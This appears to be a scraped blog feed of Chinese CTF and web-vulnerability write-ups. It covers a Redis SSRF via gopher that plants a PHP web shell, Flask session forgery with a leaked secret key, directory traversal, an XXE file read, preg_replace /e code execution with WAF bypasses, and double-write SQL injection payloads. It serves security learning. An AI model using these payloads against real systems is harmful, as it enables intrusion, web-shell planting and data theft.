@eval($_POST[&#x27;redis&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">config set dir /www/admin/localhost_80/wwwroot  </span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>现在我们用gopher协议来模拟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.144.130/123.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_%25%37%33%25%36%35%25%37%34%25%32%30%25%37%38%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%34%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%32%37%25%37%32%25%36%35%25%36%34%25%36%39%25%37%33%25%32%37%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%66%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34%25%35%66%25%33%38%25%33%30%25%32%66%25%37%37%25%37%37%25%37%37%25%37%32%25%36%66%25%36%66%25%37%34%25%32%30%25%32%30%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709214147910.png"></p><p>访问超时</p><p>但是可以看到，已经成功把马写进去了</p><p>（我这里测试的时候没有用root权限是写不进去的，所以应该要求redis是root权限打开）</p><p><img src="http://pic.bamboo22.top/image-20230709213950761.png"></p><p>蚁剑连接成功<br><img src="http://pic.bamboo22.top/image-20230709214220247.png"></p><p>其他的利用方式也就是在打redis时将redis的连接换成用gopher模拟连接</p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SYCTF 2023 CarelessPy</title>
      <link href="/2024/01/22/%5BSYCTF2023%5DCarelessPy/"/>
      <url>/2024/01/22/%5BSYCTF2023%5DCarelessPy/</url>
      
        <content type="html"><![CDATA[<h2 id="SYCTF2023-CarelessPy"><a href="#SYCTF2023-CarelessPy" class="headerlink" title="[SYCTF2023]CarelessPy"></a>[SYCTF2023]CarelessPy</h2><p><img src="http://pic.bamboo22.top/image-20230610132618291.png"></p><p>打开环境说下载图片，但其实没有什么用</p><p>查看源码，发现 <code>/eval </code>和 <code>/login </code></p><p><img src="http://pic.bamboo22.top/image-20230610132711588.png"></p><p>进入 <code>/eval </code>发现是一个命令执行，但是只要传cmd就会报错</p><p><img src="http://pic.bamboo22.top/image-20230610132912069.png"><br><img src="http://pic.bamboo22.top/image-20230610133109243.png"></p><p>进入<code>/login</code>有一个登录框，但是登录不成功</p><p><img src="http://pic.bamboo22.top/image-20230610133013051.png"></p><p><img src="http://pic.bamboo22.top/image-20230610133036210.png"></p><p>在&#x2F;login中猜测这个应该就是flask的session伪造，伪造一个成功登陆的cookie从而实现登录，那需要的秘应该就是在&#x2F;eval中去找</p><p>我们先去&#x2F;eval</p><p>这里一个一个传参去试（至于为什么我也不知道），试到app就成功了</p><p><img src="http://pic.bamboo22.top/image-20230610133620126.png"></p><p>进到这儿继续试</p><p><img src="http://pic.bamboo22.top/image-20230610133656260.png"></p><p>得到这个后就进入一开始的下载页面，就能下载.pyc文件，注意这里需要yong<code>../</code>进行目录穿越，因为要将工作目录转到网站更目录，所以要退三次</p><p><img src="http://pic.bamboo22.top/image-20230610140216067.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/eval?cmd=app</span><br><span class="line">/eval?cmd=app/__pycache__</span><br><span class="line">/download?file=../../..//app/__pycache__/part.cpython-311.pyc</span><br></pre></td></tr></table></figure><p>成功后就会下载一个.pyc文件，直接开是打不开的，改成.txt就可以看了（里面的乱码是没用的）</p><p><img src="http://pic.bamboo22.top/image-20230610141330544.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:o2takuXX_donot_like_ntr</span><br></pre></td></tr></table></figure><p>找到秘钥</p><p>下面进到login界面，先登录失败，吧cookie复制下来</p><p><img src="http://pic.bamboo22.top/image-20230610142507231.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session；</span><br><span class="line">eyJpc2xvZ2luIjpmYWxzZX0.ZIQWEw.Ym12DU18w-DqMwu6aUkiOl36U38</span><br></pre></td></tr></table></figure><p>放到flask-session-manager里面去跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s <span class="string">&quot;o2takuXX_donot_like_ntr&quot;</span> -c <span class="string">&quot;eyJpc2xvZ2luIjpmYWxzZX0.ZIQWEw.Ym12DU18w-DqMwu6aUkiOl36U38&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;islogin&#x27;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;o2takuXX_donot_like_ntr&quot;</span> -t <span class="string">&quot;&#123;&#x27;islogin&#x27;: True&#125;&quot;</span></span><br><span class="line">eyJpc2xvZ2luIjp0cnVlfQ.ZIQZiQ.dcWvoUa9FO92Jdym53c9hHkeP2Q</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230610143508723.png"></p><p>将session的值改了之后就能成功登录了</p><p><img src="http://pic.bamboo22.top/image-20230610143643300.png"></p><p>进入&#x2F;th1s_1s_The_L4st_one看到XML，想到XXE漏洞，抓包</p><p><img src="http://pic.bamboo22.top/image-20230610170650880.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1     </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE fumo [</span><br><span class="line">&lt;!ENTITY a SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;fumo&gt;&lt;web&gt;&amp;a;</span><br><span class="line">&lt;/web&gt;&lt;/fumo&gt;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230610173502583.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NEEPU-CTF 2023 ezrce</title>
      <link href="/2024/01/22/%5BNEEPU-CTF%202023%5Dezrce/"/>
      <url>/2024/01/22/%5BNEEPU-CTF%202023%5Dezrce/</url>
      
        <content type="html"><![CDATA[<h2 id="NEEPU-CTF-2023-ezrce"><a href="#NEEPU-CTF-2023-ezrce" class="headerlink" title="[NEEPU-CTF 2023]ezrce"></a>[NEEPU-CTF 2023]ezrce</h2><p><img src="http://pic.bamboo22.top/image-20230603163808883.png"></p><p>打开环境后看到提交框，随便输入点东西</p><p><img src="http://pic.bamboo22.top/image-20230603163906121.png"></p><p>可以看到源码</p><p><code>$name1=preg_replace(&#39;/hahaha/e&#39;,$qaq,$name);</code></p><p><code>/e</code>说明能当做php代码执行，所以尝试命令执行</p><p>开始传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://45e4936d.clsadp.com/?key=1223    //get</span><br><span class="line">name=hahaha&amp;qaq=system(ls);             //post</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230603165020984.png"></p><p>能够看到当前目录下的文件，但是ls更目录就看不到了，这里是<code>/</code>被过滤了</p><p>无参数rce</p><p>查看更目录下文件，其实就是构造一个<code>/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://45e4936d.clsadp.com/?key=1223</span><br><span class="line">name=hahaha&amp;qaq=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure><p>因为获取<code>/</code>有随机性，多刷新几次</p><p><img src="http://pic.bamboo22.top/image-20230603165302185.png"></p><p>看到flag后就想办法构造读flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(array_flip(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">将键值切换</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">随机抽取数组中元素</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230603171138322.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">读文件</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230603172807967.png"></p><p>因为有随机性，放到burp里面去爆，根据响应长度来找<br>按理说应该这样就能找到了，但是实际操作时刷不出来flag，还没有解决这个问题</p><p>可以看到waf.php,看到里面过滤的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$poc</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|get_defined_vars|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$poc</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker! you die!&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/01/21/hello-world/"/>
      <url>/2024/01/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一道简单CTF题目（原创）</title>
      <link href="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/"/>
      <url>/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/</url>
      
        <content type="html"><![CDATA[<h1 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h1><h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><p>主要想考查对SQL注入简单过滤的绕过，出题的时候我想尽量修改一些小地方，让网上找的<strong>payload</strong>看似很接近，但实际上要真正理解知识点才能做出来。</p><p>题目是从最流行的<strong>sqli-labs</strong>找的，用<strong>sqli-labs-less11</strong>修改而来，前端写的比较拉，主要还是想搞笑。</p><img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109213127702.png" class><img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109213140783.png" class title="image-20240109213140783"><h2 id="出题过程"><a href="#出题过程" class="headerlink" title="出题过程"></a>出题过程</h2><p>在<strong>sqli-labs-less11</strong>的源码基础上修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-1 **Error Based- String**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;</span><br><span class="line">  echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-1.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>前端就不多赘述，主要修改的代码如下：</p><p>修改了查询语句，主要是因为修改了数据库，所以查询的库名、表面变了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username, trueflag FROM fflllaaaagggg WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and trueflag=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>在输入端增加了过滤，也就是想考察对SQL注入过滤的绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\*|;|union|select|ascii|mid|ord|substr|like|substring|if|file|extractvalue|updatexml|floor|or|and|#|=|%23|-|&lt;|&gt;|\^|\|\|/i&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$uname</span>);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\*|;|union|select|ascii|mid|ord|substr|like|substring|if|file|extractvalue|updatexml|floor|or|and|#|=|%23|-|&lt;|&gt;|\^|\|\|/i&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$passwd</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;your Username:&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$uname</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;your Flag:&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$passwd</span>;</span><br></pre></td></tr></table></figure><p>加了两个正则表达式，并输出过滤后的结果，主要是方便大家看过滤了什么，是否绕过成功</p><p>正则很简单，过滤了一些关键字，都可以用双写绕过，原理也很简单，不多赘述。</p><p>过滤了注释符，这也是我主要想考的地方，<strong>POST</strong>注入用<code>#</code>注释，我把<code>#</code>和<code>%23</code>都ban了，这里一般都会想到使用万能密码<code>or &#39;1&#39;=&#39;1</code>这样的语句使SQL语句永真从而执行，来实现注释符的作用。</p><p>举个例子，一般的SQL注入的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>当我拼接上查库的操作<code>-1&#39; union select 1,2,database() or &#39;1&#39;=&#39;1</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,database() or &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以发现最后的语句变成了<code>or &#39;1&#39;=&#39;1&#39;</code>这个永真的式子，前面的SQL语句执行，从而达到注释符的作用。</p><p><strong>在本题中，我们查询的语句有两个，坑也在此埋下：</strong></p><p>当我们查询到数据库名时，用<code>oorr &#39;1&#39;=&#39;1</code>来结尾（这里其实ban了<code>=</code>,但是不影响注释效果，只要有右边<code>&#39;</code>就行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion selselectect database(),2 oorr &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>当在<strong>Username</strong>框中查询时，</p><img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109232346348.png" alt="image-20240109232346348" style="zoom:80%;"><p>会报错<code>Unknown column &#39;trueflag&#39; in &#39;field list&#39;</code>报错了，直接把我的字段名给爆出来了:sob:但是我没有改，就算知道我的字段名你也注不出来</p><p>如果我们换成在<strong>Flag</strong>框中查询时，发现成功了，库名被爆出来了</p><img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109220703457.png" class title="image-20240109220703457"><p>看起来很玄，我们来分析一下源码,我将过滤后的语句拼接上去</p><p>在<strong>Username</strong>中输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username, trueflag FROM fflllaaaagggg WHERE username=&#x27;1&#x27; union select database(),2 or &#x27;1&#x27; like &#x27;1&#x27; and trueflag=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>推测一波：前面的语句应该被正常执行，但是，后面还有一个<strong>and</strong>，<strong>and</strong>后面的内容也会被执行，<code>$passwd</code>参数中没有输入，于是<strong>and</strong>后面的内容执行错误，报错<code>Unknown column &#39;trueflag&#39; in &#39;field list&#39;</code></p><p>在本地的数据库中测试，可以看到第一次就是我们后台的SQL查询语句，报错，第二次我们删除<strong>and</strong>后面的内容，查询正常，证实了我们的猜想。</p><img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109222206092.png" alt="image-20240109222206092" style="zoom:50%;"><img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109222230002.png" alt="image-20240109222230002" style="zoom:40%;"><p>所以我们的所以查询语句都要在<strong>Flag</strong>框中才能达到我们想要的效果</p><p>继续往下进行注入,你应该不难翻出你的笔记，拼出如下查询语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke &#x27;flaginit&#x27; oorr &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure><img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109222644840.png" class title="image-20240109222644840"><p>然后发现第一位是回显第二位不是回显位，所以我们应该将查询语句放到第一位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke &#x27;flaginit&#x27; ,2 oorr &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure><p>如果你这样修改，那恭喜你，又进坑了，报错了</p><img src="/2024/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/01/09/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95CTF%E9%A2%98%E7%9B%AEezsql/image-20240109223026285.png" class title="image-20240109223026285"><p>报错的原因很简单，<code>union select 1,2 #</code>联合查询的语句，但是语句中用空格，分不清查询的两个东西了，所以说得加括号<code>()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion selselectect(selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke &#x27;flaginit&#x27;),2 oorr &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure><p>这样就ok了</p><p>走到这里应该就没什么大问题了，之后就是常规操作了</p><p>当然报错注入也是可以的，我试过，这里就留给师傅们自己测了。</p><h2 id="完整WP"><a href="#完整WP" class="headerlink" title="完整WP"></a>完整WP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion selselectect database(),2 &amp;&amp; &#x27;1&#x27;lilikeke&#x27;1      #查库</span><br><span class="line"></span><br><span class="line">1&#x27; ununionion selselectect (selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke &#x27;flaginit&#x27;),2 &amp;&amp; &#x27;1&#x27; = &#x27;1</span><br><span class="line">                                                              #查表</span><br><span class="line">1&#x27; ununionion selselectect (selselectect group_concat(column_name) from infoorrmation_schema.columns where table_name lilikeke &#x27;fflllaaaagggg&#x27;), 2 &amp;&amp; &#x27;1&#x27; = &#x27;1</span><br><span class="line">                                                              #查列</span><br><span class="line">1&#x27; ununionion selselectect (selselectect group_concat(trueflag) from 